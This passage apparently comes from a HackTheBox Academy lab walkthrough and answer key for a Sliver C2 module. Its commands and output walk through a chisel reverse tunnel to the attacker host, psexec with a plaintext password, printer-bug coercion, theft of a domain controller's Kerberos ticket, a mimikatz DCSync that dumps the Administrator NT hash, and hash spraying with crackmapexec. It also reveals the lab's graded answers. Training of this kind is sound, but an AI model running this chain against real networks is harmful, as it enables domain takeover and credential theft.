[*] Session f3beb106 psexec-pivot - 10.129.205.234:49729->eric-psexec-> (srv01) - windows/amd64 - Fri, 07 Jun 2024 16:37:59 BST
```

Seeing a new session appear, `psexec-pivot`, students need to make it their active session and then enumerate privileges via the `getprivs` utility:

Code: shell

```shell
use [ID of psexec-pivot]
getprivs
```

```
sliver (eric-psexec) > use f3beb106-adae-4bf4-8185-42fcf9bfe1e2

[*] Active session psexec-pivot (f3beb106-adae-4bf4-8185-42fcf9bfe1e2)

sliver (psexec-pivot) > getprivs

Privilege Information for GLAND9oo.exe (PID: 3768)
--------------------------------------------------

Process Integrity Level: {hidden}
```

Students will see the process integrity level is labeled `{hidden}`.

Answer: `High`

# Kerberos Delegations

## Question 1

### "Submit the Administrator's NT hash"

To begin, students need need ensure that `Rubeus.exe` and `SpoolSample.exe` have been downloaded and are present on their attack host, along with the `mingw-w64` package. Mimikatz will be needed as well:

Code: shell

```shell
cd ~/sliver
wget -q https://github.com/jtmpu/PrecompiledBinaries/raw/master/Rubeus/Rubeus.exe wget -q https://github.com/jtmpu/PrecompiledBinaries/raw/master/SpoolSample.exe
sudo apt install mingw-w64
cp /usr/share/mimikatz/x64/mimikatz.exe .
```

```
┌─[eu-academy-1]─[10.10.14.96]─[htb-ac-594497@htb-mqrjdoxjxh]─[~/sliver]
└──╼ [★]$ wget -q https://github.com/jtmpu/PrecompiledBinaries/raw/master/Rubeus/Rubeus.exe

┌─[eu-academy-1]─[10.10.14.96]─[htb-ac-594497@htb-mqrjdoxjxh]─[~/sliver]
└──╼ [★]$ wget -q https://github.com/jtmpu/PrecompiledBinaries/raw/master/SpoolSample.exe

┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-marvyohs0x]─[~/sliver]
└──╼ [★]$ sudo apt install mingw-w64

Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following package was automatically installed and is no longer required:
  grub-pc-bin
<SNIP>
┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-marvyohs0x]─[~/sliver]
└──╼ [★]$ cp /usr/share/mimikatz/x64/mimikatz.exe .
```

Also required is students be able to interact with `SRV01` from their attack host; therefore, they need to repeat the steps shown in the `Pivoting` section to enable Reverse Port Forwarding on the `Web01` host. Therefore, students need to download the chisel extension and configure it:

Code: shell

```shell
git clone https://github.com/MrAle98/chisel
cd chisel/
mkdir ~/.sliver-client/extensions/chisel
cp extension.json ~/.sliver-client/extensions/chisel/
make windowsdll_64
make windowsdll_32
```

```
┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-marvyohs0x]─[~/sliver]
└──╼ [★]$ git clone https://github.com/MrAle98/chisel

Cloning into 'chisel'...
remote: Enumerating objects: 2238, done.
remote: Counting objects: 100% (644/644), done.
remote: Compressing objects: 100% (217/217), done.
remote: Total 2238 (delta 500), reused 427 (delta 427), pack-reused 1594
Receiving objects: 100% (2238/2238), 3.42 MiB | 18.06 MiB/s, done.
Resolving deltas: 100% (1121/1121), done.

┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-marvyohs0x]─[~/sliver]
└──╼ [★]$ cd chisel/

┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-marvyohs0x]─[~/sliver/chisel]
└──╼ [★]$ mkdir ~/.sliver-client/extensions/chisel

┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-marvyohs0x]─[~/sliver/chisel]
└──╼ [★]$ cp extension.json ~/.sliver-client/extensions/chisel/

┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-marvyohs0x]─[~/sliver/chisel]
└──╼ [★]$ make windowsdll_64

env CGO_ENABLED=1 GOOS=windows GOARCH=amd64 CC=x86_64-w64-mingw32-gcc-win32 go build -buildmode=c-shared -trimpath -ldflags "-s -w  -buildid=c510d5ddeb8fb075d7a8696deafa16ecd0da7ed0 -X github.com/jpillora/chisel/share.BuildVersion=v1.8.1"   -o ~/.sliver-client/extensions/chisel/chisel.x64.dll .
g<SNIP>

┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-marvyohs0x]─[~/sliver/chisel]
└──╼ [★]$ make windowsdll_32

env CGO_ENABLED=1 GOOS=windows GOARCH=386 CC=i686-w64-mingw32-gcc-win32 go build -buildmode=c-shared -trimpath -ldflags "-s -w  -buildid=c510d5ddeb8fb075d7a8696deafa16ecd0da7ed0 -X github.com/jpillora/chisel/share.BuildVersion=v1.8.1"   -o ~/.sliver-client/extensions/chisel/chisel.32.dll .
```

Subsequently students need to configure their `proxchains.conf` to use SOCKS5 on port 1080, followed by starting the `chisel server` from their attack host:

Code: shell

```shell
sudo sh -c 'sed -i s/socks4/socks5/g /etc/proxychains.conf && sed -i s/9050/1080/g /etc/proxychains.conf'
chisel server --reverse -v --socks5
```

```
┌─[eu-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-mqrjdoxjxh]─[~/sliver]
└──╼ [★]$ chisel server --reverse

2024/06/07 18:17:28 server: Reverse tunnelling enabled
2024/06/07 18:17:28 server: Fingerprint iJY8shKk6iW7ES4x4wVtNIvPSbM4GUGC8s7dB69moTY=
2024/06/07 18:17:28 server: Listening on http://0.0.0.0:8080
```

After the `Lateral Movement` section, students should have a session on `Web01` as `eric`, and a session on `SRV01` as `svc_sql`. Students need to return to the Sliver pivot session on `SRV01` that was obtained during the `Lateral Movement` section, and upload `Rubeus.exe` with `mimikatz.exe`:

Code: shell

```shell
use [ID of psexec-pivot]
mkdir C:/temp
cd C:/temp
upload Rubeus.exe
upload mimikatz.exe
```

```
sliver (eric-psexec) > use f3beb106-adae-4bf4-8185-42fcf9bfe1e2

[*] Active session psexec-pivot (f3beb106-adae-4bf4-8185-42fcf9bfe1e2)

sliver (psexec-pivot) > mkdir C:/temp

[*] C:\temp

sliver (psexec-pivot) > cd C:/temp

[*] C:\temp

sliver (psexec-pivot) > upload Rubeus.exe

[*] Wrote file to C:\temp\Rubeus.exe

sliver (psexec-pivot) > upload mimikatz.exe

[*] Wrote file to C:\temp\mimikatz.exe
```

Next, students need close out of the `sliver-client` entirely and re-launch it. Then, return to the session on `Web01`, and use the `chisel` plugin to connect back to the `chisel server` running on their attack host:

Code: shell

```shell
use [ID of web01 session]
chisel client PWNIP:8080 R:socks
```

Code: sesssion

```
sliver > use 15664ed7-092a-4a3b-83dd-4694c3c41e78

[*] Active session web01-eric (15664ed7-092a-4a3b-83dd-4694c3c41e78)

sliver (web01-eric) > chisel client 10.10.14.180:8080 R:socks

[*] Successfully executed chisel
[*] Got output:
received argstring: client 10.10.14.180:8080 R:socks
os.Args = [chisel.exe client 10.10.14.180:8080 R:socks]
Task started successfully.
```

Students need to check their `chisel server` to confirm the connection:

```
┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-marvyohs0x]─[~/sliver]
└──╼ [★]$ chisel server --reverse -v --socks5

2024/06/09 06:16:16 server: Reverse tunnelling enabled
2024/06/09 06:16:16 server: Fingerprint JiLSfUtYVknrrLA1cdnTRuCcT1cbVtyxf3lU01FoAKI=
2024/06/09 06:16:16 server: Listening on http://0.0.0.0:8080
2024/06/09 06:28:24 server: session#1: Handshaking with 10.129.205.234:49833...
2024/06/09 06:28:24 server: session#1: Verifying configuration
2024/06/09 06:28:24 server: session#1: Client version (v1.8.1) differs from server version (1.7.7)
2024/06/09 06:28:24 server: session#1: tun: Created (SOCKS enabled)
2024/06/09 06:28:24 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
2024/06/09 06:28:24 server: session#1: tun: SSH connected
2024/06/09 06:28:24 server: session#1: tun: Bound proxies
```

With the current configuration, students need to open a new tab on their attack host, using `proxychains impacket-psexec` to connect to `SRV01` as `svc_sql`, where they will launch `Rubeus.exe` to monitor for TGTs:

Code: shell

```shell
proxychains impacket-psexec child/svc_sql:jkhnrjk123\!@172.16.1.12
cd C:\temp
.\Rubeus.exe monitor /interval:5 /nowrap
```

```
┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-marvyohs0x]─[~/sliver]
└──╼ [★]$ proxychains impacket-psexec child/svc_sql:jkhnrjk123\!@172.16.1.12

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] DLL init: proxychains-ng 4.14
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.12:445  ...  OK
[*] Requesting shares on 172.16.1.12.....
[*] Found writable share ADMIN$
[*] Uploading file buuOpXWe.exe
[*] Opening SVCManager on 172.16.1.12.....
[*] Creating service BhUV on 172.16.1.12.....
[*] Starting service BhUV.....
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.12:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.12:445  ...  OK
[!] Press help for extra shell commands
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.12:445  ...  OK
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:\temp

C:\temp>powershell

Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

C:\temp>.\Rubeus.exe monitor /interval:5 /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.4.2 

[*] Action: TGT Monitoring
[*] Monitoring every 5 seconds for 4624 logon events
```

Now, students need to return to Sliver, and `use` the `psexec-pivot` session where they will utilize `inline-execite-assembly` with `SpoolSample.exe` to coerce `DC01` into connecting to `SRV01`:

Code: shell

```shell
use [ID of psexec-pivot]
inline-execute-assembly SpoolSample.exe 'dc01 srv01'
```

```
sliver (web01-eric) > use 0e40bcd0-5587-41cd-9646-33658652243d

[*] Active session psexec-pivot (0e40bcd0-5587-41cd-9646-33658652243d)

sliver (psexec-pivot) > inline-execute-assembly SpoolSample.exe 'dc01 srv01'

[*] Successfully executed inline-execute-assembly (coff-loader)
[*] Got output:
[+] Success - Wrote 157715 bytes to memory
[+] Using arguments: dc01 srv01

[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function

[+] inlineExecute-Assembly Finished
```

Students need to check the terminal tab where `Rubeus.exe` was monitoring, and find the base64 encoded Kirbi ticket for `DC01$`:

```
ServiceName              : krbtgt/CHILD.HTB.LOCAL
    TargetName               : 
    ClientName               : DC01$
    DomainName               : CHILD.HTB.LOCAL
    TargetDomainName         : CHILD.HTB.LOCAL
    AltTargetDomainName      : CHILD.HTB.LOCAL
    SessionKeyType           : aes256_cts_hmac_sha1
    Base64SessionKey         : SmVw7eBm4NxZHHJuWc6UBEc9Z9PY2fZCT9Vz/cWZ69A=
    KeyExpirationTime        : 12/31/1600 4:00:00 PM
    TicketFlags              : name_canonicalize, pre_authent, renewable, forwarded, forwardable
    StartTime                : 6/9/2024 4:40:08 AM
    EndTime                  : 6/9/2024 2:40:07 PM
    RenewUntil               : 6/16/2024 4:40:07 AM
    TimeSkew                 : 0
    EncodedTicketSize        : 1322
    Base64EncodedTicket      :

      doIFJjCCBSKgAwIBBaEDAgEWooIEJTCCBCFhggQdMIIEGaADAgEFoREbD0NISUxELkhUQi5MT0NBTKIkMCKgAwIBAqEbMBkbBmtyYnRndBsPQ0hJTEQuSFRCLkxPQ0FMo4ID1zCCA9OgAwIBEqEDAgECooIDxQSCA8FLHx/qSbiJygbO0vl7nT1JrWj+S1GnGH+iHB+nM5s+DPy83/9cQdpLLowxrTa6w/TAbM3q6slgaj62Yy6lQ67g5j8La6pXIkP4VfQJtCEawWPNwUTkWCprn3RRZNQqXvv6Cz7i4FFp1BwP4Mc9fayki8xgfJ5jm8RQxtApjiG6B2zmYzWG+g4bqMwtYgP4Ap1jeEKmbkCljruinwmwpiUdbNvrYbbO4KUarqhOdtk3WKr5oVZa4KBuXw1yDtvB0lkzrRgHx9fOzhOSoDBVm4y2x18QUgcwc2Lfcb6wnK2v+ReFvsT/tj0AgzWV7eeltkTRnRkxX8Bj7yFLBlCk9qbBuNEn1V82XFOqJZOQklAqGu7yldN578Ve/SwD7IVaMlYrwnsSZqKTEqvM6SEkNpP4lEtaY7mix5nYAN6BWzbEOJlcEGied00DZRFCk2OmlGZrHnJQp3lOSnF+srSJOHcldHX3ADvJS9VgQe7Xzj+0xjLtjBvbPjICdwpWn6dRwId9AvS9qrd8QEgGtgoIZv4OqKiJYsQXx2Fv0m9+AhX2b+GTIaEQmSPuB+0AY1ZL/v3/yxshp3FwhZ0gNWUyQWiND+2QN7oUcptfuedMOczcZGvTAihZRdaGZqRzcawCDT//XUuFENGPDi4DtyyThdiByImi/CV6/WKOWed84ouobzqU6SncOlitdU6FeN1pWDIanOyXOXf2z8fzjgGiok10iu3QujNVw8T0mMcxlLwtySydEtlkX7Ww6vBJplgBboaUpCFkjUONZxuw3AW8eCJgm73WDKJHeG2NkXaMY+na5q7PGF7kwCXQxeFtPjV9jXVoCvUBdlfg69C3O8apMB4N7i6lK9RM2ATcGT/yEAOKqzWCjkLR83FplXywml6gxTJK8wmjkcllY0ls9wMDZgcCAiYA1gMLRhZrjE9jsNf2zCHVm7jOE2CkRLYQusNMyEklENyZEwssAr38JFcIBnlwfm+KetlQ8zLU40B7l/Hdfj6bXLq2bhDbRasJweTGFK20EIpXnJiSSaKkUJutSLsx8MgexXlUqMjN6JES957JLWHVgSFRPwp7t3xN7tP7EEa+L2vV1BUqO3D11/8gFWl+oj9SEB25slKhTQzYWjRxgCz55F7xo+LpRTSElpAibNj7XNyjikPfW5jPh9fnW63gCO03wvYuN1NRTuGVZXfeU42ATZMH11iy4Gw9VYKhOBwsoTxRpQclsqaSNz1PwGAm43w6EsxbpdSbnlNNaHq02n96Q6bVmG9WDx1gBrCuplDyo4HsMIHpoAMCAQCigeEEgd59gdswgdiggdUwgdIwgc+gKzApoAMCARKhIgQgSmVw7eBm4NxZHHJuWc6UBEc9Z9PY2fZCT9Vz/cWZ69ChERsPQ0hJTEQuSFRCLkxPQ0FMohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNDA2MDkxMTQwMDhaphEYDzIwMjQwNjA5MjE0MDA3WqcRGA8yMDI0MDYxNjExNDAwN1qoERsPQ0hJTEQuSFRCLkxPQ0FMqSQwIqADAgECoRswGRsGa3JidGd0Gw9DSElMRC5IVEIuTE9DQUw=

[*] Extracted  1 total tickets
```

From the `PowerShell` session on `SRV01`, students need to decocde the `DC01$` kirbi ticket, saving it as `dc01.kirbi`:

Code: shell

```shell
[System.IO.File]::WriteAllBytes("C:\windows\temp\dc01.kirbi",[System.Convert]::FromBase64String("doIFJjCCBSKgAwIBBaEDAgEWooIEJTCCBCFhggQdMIIEGaADAgEFoREbD0NISUxELkhUQi5MT0NBTKIkMCKgAwIBAqEbMBkbBmtyYnRndBsPQ0hJTEQuSFRCLkxPQ0FMo4ID1zCCA9OgAwIBEqEDAgECooIDxQSCA8FLHx/qSbiJygbO0vl7nT1JrWj+S1GnGH+iHB+nM5s+DPy83/9cQdpLLowxrTa6w/TAbM3q6slgaj62Yy6lQ67g5j8La6pXIkP4VfQJtCEawWPNwUTkWCprn3RRZNQqXvv6Cz7i4FFp1BwP4Mc9fayki8xgfJ5jm8RQxtApjiG6B2zmYzWG+g4bqMwtYgP4Ap1jeEKmbkCljruinwmwpiUdbNvrYbbO4KUarqhOdtk3WKr5oVZa4KBuXw1yDtvB0lkzrRgHx9fOzhOSoDBVm4y2x18QUgcwc2Lfcb6wnK2v+ReFvsT/tj0AgzWV7eeltkTRnRkxX8Bj7yFLBlCk9qbBuNEn1V82XFOqJZOQklAqGu7yldN578Ve/SwD7IVaMlYrwnsSZqKTEqvM6SEkNpP4lEtaY7mix5nYAN6BWzbEOJlcEGied00DZRFCk2OmlGZrHnJQp3lOSnF+srSJOHcldHX3ADvJS9VgQe7Xzj+0xjLtjBvbPjICdwpWn6dRwId9AvS9qrd8QEgGtgoIZv4OqKiJYsQXx2Fv0m9+AhX2b+GTIaEQmSPuB+0AY1ZL/v3/yxshp3FwhZ0gNWUyQWiND+2QN7oUcptfuedMOczcZGvTAihZRdaGZqRzcawCDT//XUuFENGPDi4DtyyThdiByImi/CV6/WKOWed84ouobzqU6SncOlitdU6FeN1pWDIanOyXOXf2z8fzjgGiok10iu3QujNVw8T0mMcxlLwtySydEtlkX7Ww6vBJplgBboaUpCFkjUONZxuw3AW8eCJgm73WDKJHeG2NkXaMY+na5q7PGF7kwCXQxeFtPjV9jXVoCvUBdlfg69C3O8apMB4N7i6lK9RM2ATcGT/yEAOKqzWCjkLR83FplXywml6gxTJK8wmjkcllY0ls9wMDZgcCAiYA1gMLRhZrjE9jsNf2zCHVm7jOE2CkRLYQusNMyEklENyZEwssAr38JFcIBnlwfm+KetlQ8zLU40B7l/Hdfj6bXLq2bhDbRasJweTGFK20EIpXnJiSSaKkUJutSLsx8MgexXlUqMjN6JES957JLWHVgSFRPwp7t3xN7tP7EEa+L2vV1BUqO3D11/8gFWl+oj9SEB25slKhTQzYWjRxgCz55F7xo+LpRTSElpAibNj7XNyjikPfW5jPh9fnW63gCO03wvYuN1NRTuGVZXfeU42ATZMH11iy4Gw9VYKhOBwsoTxRpQclsqaSNz1PwGAm43w6EsxbpdSbnlNNaHq02n96Q6bVmG9WDx1gBrCuplDyo4HsMIHpoAMCAQCigeEEgd59gdswgdiggdUwgdIwgc+gKzApoAMCARKhIgQgSmVw7eBm4NxZHHJuWc6UBEc9Z9PY2fZCT9Vz/cWZ69ChERsPQ0hJTEQuSFRCLkxPQ0FMohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNDA2MDkxMTQwMDhaphEYDzIwMjQwNjA5MjE0MDA3WqcRGA8yMDI0MDYxNjExNDAwN1qoERsPQ0hJTEQuSFRCLkxPQ0FMqSQwIqADAgECoRswGRsGa3JidGd0Gw9DSElMRC5IVEIuTE9DQUw="))
```

```
PS C:\temp> [System.IO.File]::WriteAllBytes("C:\windows\temp\dc01.kirbi",[System.Convert]::FromBase64String("doIFJjCCBSKgAwIBBaEDAgEWooIEJTCCBCFhggQdMIIEGaADAgEFoREbD0NISUxELkhUQi5MT0NBTKIkMCKgAwIBAqEbMBkbBmtyYnRndBsPQ0hJTEQuSFRCLkxPQ0FMo4ID1zCCA9OgAwIBEqEDAgECooIDxQSCA8FLHx/qSbiJygbO0vl7nT1JrWj+S1GnGH+iHB+nM5s+DPy83/9cQdpLLowxrTa6w/TAbM3q6slgaj62Yy6lQ67g5j8La6pXIkP4VfQJtCEawWPNwUTkWCprn3RRZNQqXvv6Cz7i4FFp1BwP4Mc9fayki8xgfJ5jm8RQxtApjiG6B2zmYzWG+g4bqMwtYgP4Ap1jeEKmbkCljruinwmwpiUdbNvrYbbO4KUarqhOdtk3WKr5oVZa4KBuXw1yDtvB0lkzrRgHx9fOzhOSoDBVm4y2x18QUgcwc2Lfcb6wnK2v+ReFvsT/tj0AgzWV7eeltkTRnRkxX8Bj7yFLBlCk9qbBuNEn1V82XFOqJZOQklAqGu7yldN578Ve/SwD7IVaMlYrwnsSZqKTEqvM6SEkNpP4lEtaY7mix5nYAN6BWzbEOJlcEGied00DZRFCk2OmlGZrHnJQp3lOSnF+srSJOHcldHX3ADvJS9VgQe7Xzj+0xjLtjBvbPjICdwpWn6dRwId9AvS9qrd8QEgGtgoIZv4OqKiJYsQXx2Fv0m9+AhX2b+GTIaEQmSPuB+0AY1ZL/v3/yxshp3FwhZ0gNWUyQWiND+2QN7oUcptfuedMOczcZGvTAihZRdaGZqRzcawCDT//XUuFENGPDi4DtyyThdiByImi/CV6/WKOWed84ouobzqU6SncOlitdU6FeN1pWDIanOyXOXf2z8fzjgGiok10iu3QujNVw8T0mMcxlLwtySydEtlkX7Ww6vBJplgBboaUpCFkjUONZxuw3AW8eCJgm73WDKJHeG2NkXaMY+na5q7PGF7kwCXQxeFtPjV9jXVoCvUBdlfg69C3O8apMB4N7i6lK9RM2ATcGT/yEAOKqzWCjkLR83FplXywml6gxTJK8wmjkcllY0ls9wMDZgcCAiYA1gMLRhZrjE9jsNf2zCHVm7jOE2CkRLYQusNMyEklENyZEwssAr38JFcIBnlwfm+KetlQ8zLU40B7l/Hdfj6bXLq2bhDbRasJweTGFK20EIpXnJiSSaKkUJutSLsx8MgexXlUqMjN6JES957JLWHVgSFRPwp7t3xN7tP7EEa+L2vV1BUqO3D11/8gFWl+oj9SEB25slKhTQzYWjRxgCz55F7xo+LpRTSElpAibNj7XNyjikPfW5jPh9fnW63gCO03wvYuN1NRTuGVZXfeU42ATZMH11iy4Gw9VYKhOBwsoTxRpQclsqaSNz1PwGAm43w6EsxbpdSbnlNNaHq02n96Q6bVmG9WDx1gBrCuplDyo4HsMIHpoAMCAQCigeEEgd59gdswgdiggdUwgdIwgc+gKzApoAMCARKhIgQgSmVw7eBm4NxZHHJuWc6UBEc9Z9PY2fZCT9Vz/cWZ69ChERsPQ0hJTEQuSFRCLkxPQ0FMohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNDA2MDkxMTQwMDhaphEYDzIwMjQwNjA5MjE0MDA3WqcRGA8yMDI0MDYxNjExNDAwN1qoERsPQ0hJTEQuSFRCLkxPQ0FMqSQwIqADAgECoRswGRsGa3JidGd0Gw9DSElMRC5IVEIuTE9DQUw="))

[System.IO.File]::WriteAllBytes("C:\windows\temp\dc01.kirbi",[System.Convert]::FromBase64String("doIFJjCCBSKgAwIBBaEDAgEWooIEJTCCBCFhggQdMIIEGaADAgEFoREbD0NISUxELkhUQi5MT0NBTKIkMCKgAwIBAqEbMBkbBmtyYnRndBsPQ0hJTEQuSFRCLkxPQ0FMo4ID1zCCA9OgAwIBEqEDAgECooIDxQSCA8FLHx/qSbiJygbO0vl7nT1JrWj+S1GnGH+iHB+nM5s+DPy83/9cQdpLLowxrTa6w/TAbM3q6slgaj62Yy6lQ67g5j8La6pXIkP4VfQJtCEawWPNwUTkWCprn3RRZNQqXvv6Cz7i4FFp1BwP4Mc9fayki8xgfJ5jm8RQxtApjiG6B2zmYzWG+g4bqMwtYgP4Ap1jeEKmbkCljruinwmwpiUdbNvrYbbO4KUarqhOdtk3WKr5oVZa4KBuXw1yDtvB0lkzrRgHx9fOzhOSoDBVm4y2x18QUgcwc2Lfcb6wnK2v+ReFvsT/tj0AgzWV7eeltkTRnRkxX8Bj7yFLBlCk9qbBuNEn1V82XFOqJZOQklAqGu7yldN578Ve/SwD7IVaMlYrwnsSZqKTEqvM6SEkNpP4lEtaY7mix5nYAN6BWzbEOJlcEGied00DZRFCk2OmlGZrHnJQp3lOSnF+srSJOHcldHX3ADvJS9VgQe7Xzj+0xjLtjBvbPjICdwpWn6dRwId9AvS9qrd8QEgGtgoIZv4OqKiJYsQXx2Fv0m9+AhX2b+GTIaEQmSPuB+0AY1ZL/v3/yxshp3FwhZ0gNWUyQWiND+2QN7oUcptfuedMOczcZGvTAihZRdaGZqRzcawCDT//XUuFENGPDi4DtyyThdiByImi/CV6/WKOWed84ouobzqU6SncOlitdU6FeN1pWDIanOyXOXf2z8fzjgGiok10iu3QujNVw8T0mMcxlLwtySydEtlkX7Ww6vBJpgBboaUpCFkjUONZxuw3AW8eCJgm73WDKJHeG2NkXaMY+na5q7PGF7kwCXQxeFtPjV9jXVoCvUBdlfg69C3O8apMB4N7i6lK9RM2ATcGT/yEAOKqzWCjkLR83FplXywml6gxTJK8wmjkcllY0ls9wMDZgcCAiYA1gMLRhZrjE9jsNf2zCHVm7jOE2CkRLYQusNMyEklENyZEwssAr38JFcIBnlwfm+KetlQ8zLU40B7l/Hdfj6bXLq2bhDbRasJweTGFK20EIpXnJiSSaKkUJutSLsx8MgexXlUqMjN6JES957JLWHVgSFRPwp7t3xN7tP7EEa+L2vV1BUqO3D11/8gFWl+oj9SEB25slKhTQzYWjRxgCz55F7xo+LpRTSElpAibNj7XNyjikPfW5jPh9fnW63gCO03wvYuN1NRTuGVZXfeU42ATZMH11iy4Gw9VYKhOBwsoTxRpQclsqaSNz1PwGAm43w6EsxbpdSbnlNNaHq02n96Q6bVmG9WDx1gBrCuplDyo4HsMIHpoAMCAQCigeEEgd59gdswgdiggdUwgdIwgc+gKzApoAMCARKhIgQgSmVw7eBm4NxZHHJuWc6UBEc9Z9PY2fZCT9Vz/cWZ69ChERsPQ0hJTEQuSFRCLkxPQ0FMohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNDA2MDkxMTQwMDhaphEYDzIwMjQwNjA5MjE0MDA3WqcRGA8yMDI0MDYxNjExNDAwN1qoERsPQ0hJTEQuSFRCLkxPQ0FMqSQwIqADAgECoRswGRsGa3JidGd0Gw9DSElMRC5IVEIuTE9DQUw="))
```

Finally, students need to `pass the ticket` with `mimikatz`, followed by a DCSync attack as the `DC01$` user, ultimately obtaining the domain administrator's hash:

Code: shell

```shell
.\mimikatz.exe "privilege::debug" "kerberos::ptt C:\windows\temp\dc01.kirbi" "lsadump::dcsync /domain:child.htb.local /user:child\administrator" "exit"
```

```
PS C:\temp> .\mimikatz.exe "privilege::debug" "kerberos::ptt C:\windows\temp\dc01.kirbi" "lsadump::dcsync /domain:child.htb.local /user:child\administrator" "exit"

\mimikatz.exe "privilege::debug" "kerberos::ptt C:\windows\temp\dc01.kirbi" "lsadump::dcsync /domain:child.htb.local /user:child\administrator" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # kerberos::ptt C:\windows\temp\dc01.kirbi

* File: 'C:\windows\temp\dc01.kirbi': OK

mimikatz(commandline) # lsadump::dcsync /domain:child.htb.local /user:child\administrator
[DC] 'child.htb.local' will be the domain
[DC] 'dc01.child.htb.local' will be the DC server
[DC] 'child\administrator' will be the user account

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00110200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD NOT_DELEGATED )
Account expiration   : 
Password last change : 9/13/2022 5:43:17 PM
Object Security ID   : S-1-5-21-2749819870-3967162335-1946002573-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: {hidden}
```

Answer: `e7d6a507876e2c8b7534143c1c6f28ba`

# Kerberos Delegations

## Question 2

### "Enter the numerical value of the machines that can be accessed via the Administrator's hash"

Utilizing the administrator hash found in the previous challenge question, students need to use `proxychains` with `crackmapexec` and test the credentials against the entire 172.16.8.0/24 subnet:

Code: shell

```shell
proxychains -q cme smb 172.16.1.0/24 -u Administrator -H e7d6a507876e2c8b7534143c1c6f28ba
```

```
┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-marvyohs0x]─[~/sliver]
└──╼ [★]$ proxychains -q cme smb 172.16.1.0/24 -u Administrator -H e7d6a507876e2c8b7534143c1c6f28ba

[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing FTP protocol database
[*] Initializing MSSQL protocol database
[*] Initializing WINRM protocol database
[*] Initializing LDAP protocol database
[*] Initializing RDP protocol database
[*] Initializing SSH protocol database
[*] Initializing SMB protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         172.16.1.12     445    SRV01            [*] Windows 10.0 Build 17763 x64 (name:SRV01) (domain:child.htb.local) (signing:False) (SMBv1:False)
SMB         172.16.1.16     445    DC02             [*] Windows 10.0 Build 17763 x64 (name:DC02) (domain:htb.local) (signing:True) (SMBv1:False)
SMB         172.16.1.11     445    WEB01            [*] Windows 10.0 Build 17763 x64 (name:WEB01) (domain:child.htb.local) (signing:False) (SMBv1:False)
SMB         172.16.1.15     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:child.htb.local) (signing:True) (SMBv1:False)
SMB         172.16.1.13     445    SRV02            [*] Windows 10.0 Build 17763 x64 (name:SRV02) (domain:child.htb.local) (signing:False) (SMBv1:False)
SMB         172.16.1.12     445    SRV01            [+] child.htb.local\Administrator:e7d6a507876e2c8b7534143c1c6f28ba (Pwn3d!)
SMB         172.16.1.16     445    DC02             [-] htb.local\Administrator:e7d6a507876e2c8b7534143c1c6f28ba STATUS_LOGON_FAILURE 
SMB         172.16.1.11     445    WEB01            [-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         172.16.1.15     445    DC01             [+] child.htb.local\Administrator:e7d6a507876e2c8b7534143c1c6f28ba (Pwn3d!)
SMB         172.16.1.13     445    SRV02            [+] child.htb.local\Administrator:e7d6a507876e2c8b7534143c1c6f28ba (Pwn3d!)
```

Students will find `{hidden}` total hosts, three of which the user has Administrator privileges.

Answer: `4`

# DACL Exploitation

## Question 1

### "What kind of permission does David have over websec"

Students need to continue from where they left off after the `Kerberos Delegations` section, ensuring they have the `psexec-pivot` session on `SRV01`, the beacon on `Web01`, as well as a reverse SOCKS5 tunnel with `chisel`.

